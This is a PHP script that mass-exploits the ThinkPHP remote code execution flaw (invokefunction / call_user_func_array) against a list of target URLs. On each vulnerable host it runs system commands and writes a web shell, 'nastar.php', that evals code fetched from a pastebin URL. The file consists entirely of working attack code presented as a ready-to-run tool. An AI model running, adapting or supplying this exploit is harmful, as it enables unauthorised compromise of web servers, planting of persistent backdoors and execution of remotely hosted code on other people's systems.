<?php
// Coded By N4ST4R_ID
// Thx to Shuzu
class Exploit {
	
	private $shell = "nastar.php";
	
	public function x0x($url) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$xx = curl_exec($ch);
		$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		return ["head" => $info, "body" => $xx];
		}
		
	public function erceeh($url) {
		echo "\n";
		echo "\033[3;34m[*] Exploiting ".$url."\n";
		$cek = $this->x0x($url.'/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%27N4ST4R_ID%27');
		if(preg_match("/N4ST4R_ID/", $cek["body"])) {
			$up = '<?php%20eval("?>".file_get_contents("https://pastebin.com/raw/YNpriSQu"));%20?>';
			echo "\033[0;32m[+] ".$url." VULN! \n";
			$this->x0x($url.'/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%27{$up}%27%20>%20'.$this->shell);
			$c3k = $this->x0x($url."/public/".$this->shell);
			if($c3k["head"] == 200) {
				echo "\033[0;32m[+] Sukses upload shell > ".$url."/public/".$this->shell."\n";
			} else {
				echo "\033[0;31m[-] Gagal upload shell > ".$url." Try manual!\n";
			}
		} else {
			echo "\033[0;31m[-] ".$url." NOT VULN!\n";
		}
	}
}

$exploit = new Exploit();
if(!$argv[1]) {
	echo "\033[0;31m[!] Usage: php $argv[0] LIST\n";
} else {
	echo "\033[1;37m
	###################################
	#   ThinkPHP RCE Mass Exploiter   #
	# Author: N4ST4R_ID | D704T team  #
	#      www.NyamuXpl0it.xyz        #
	################################### \n
	";
	$a = $argv[1];
	$b = file_get_contents($a);
	$c = explode("\n", $b);
	foreach($c as $d) {
		$exploit->erceeh($d);
	}
}
?>
